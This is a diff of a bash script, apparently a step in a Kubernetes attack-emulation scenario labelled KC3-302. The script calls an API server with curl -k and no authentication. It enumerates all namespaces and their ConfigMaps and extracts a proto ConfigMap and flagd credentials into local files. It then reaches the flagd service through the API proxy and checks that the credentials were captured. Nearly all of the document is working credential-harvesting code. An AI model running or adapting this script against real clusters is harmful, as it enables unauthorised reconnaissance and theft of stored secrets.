@@ -32,23 +32,25 @@ FNCREDS="$DATA_PATH/KC3/credentials"
 require_tools curl jq
 mkdir -p "$DATA_PATH/KC3"
 
-echo "[*] Request /healthz /version /apis /namespaces to API"
+echo "[KC3-302] probing Kubernetes API discovery endpoints"
 curl -k "${API_SERVER}/healthz" >/dev/null
 curl -k "${API_SERVER}/version" >/dev/null
 curl -k "${API_SERVER}/apis" >/dev/null
 mapfile -t NAMESPACES < <(curl -k "${API_SERVER}/api/v1/namespaces" | jq -r '.items[].metadata.name')
 
-echo "[*] Found ${#NAMESPACES[@]} namespace"
+printf '%s\n' "${NAMESPACES[@]}" > "$DATA_PATH/KC3/namespaces.txt"
+CONFIGMAPS_FILE="$DATA_PATH/KC3/configmaps.txt"
+: > "$CONFIGMAPS_FILE"
+echo "[KC3-302] found ${#NAMESPACES[@]} namespaces; inventory saved in $DATA_PATH/KC3"
 # 3. loop on each ns and download configmap
 for ns in "${NAMESPACES[@]}"; do
-  echo "=== Namespace: $ns ==="
   if ! resp="$(curl -fsSk "$API_SERVER/api/v1/namespaces/$ns/configmaps" 2>/dev/null)"; then
-    echo "  (skip: curl failed)"
+    echo "${ns}: <unreadable>" >> "$CONFIGMAPS_FILE"
     continue
   fi
   # print names; if JSON empty/not valid, don't fail
-  jq -r '.items[]?.metadata.name' <<<"$resp" 2>/dev/null || echo "  (no items / invalid JSON)"
-  echo
+  jq -r --arg ns "$ns" '.items[]?.metadata.name | "\($ns)/\(.)"' <<<"$resp" >> "$CONFIGMAPS_FILE" 2>/dev/null \
+    || echo "${ns}: <invalid-json>" >> "$CONFIGMAPS_FILE"
 done
 
 curl -sk "${API_SERVER}/api/v1/namespaces/${NSPROTO}/configmaps" \
@@ -60,5 +62,9 @@ curl -sk "$API_SERVER/api/v1/namespaces/$NSCREDS/configmaps" \
   | select(.metadata.name==$CMNAME)
   | .data[]' > "$FNCREDS"
 
-echo "[*] Contacting flagd"
-curl -k "${API_SERVER}/api/v1/namespaces/${NSCREDS}/services/flagd:4000/proxy/feature"
+test -s "$FNPROTO" || { echo "Expected proto ConfigMap data was not collected into $FNPROTO" >&2; exit 1; }
+test -s "$FNCREDS" || { echo "Expected flagd credentials were not collected into $FNCREDS" >&2; exit 1; }
+
+echo "[KC3-302] collected proto and flagd UI credentials"
+curl -fk "${API_SERVER}/api/v1/namespaces/${NSCREDS}/services/flagd:4000/proxy/feature" >/dev/null
+echo "[KC3-302] flagd UI reachable"
